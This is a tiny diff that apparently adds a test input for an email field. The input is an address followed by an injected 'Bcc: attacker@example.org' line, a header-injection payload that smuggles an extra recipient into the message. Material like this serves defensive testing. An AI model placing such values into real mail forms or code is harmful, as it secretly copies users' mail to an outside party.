@@ -1,0 +1,2 @@
+bob@example.org
+Bcc: attacker@example.org
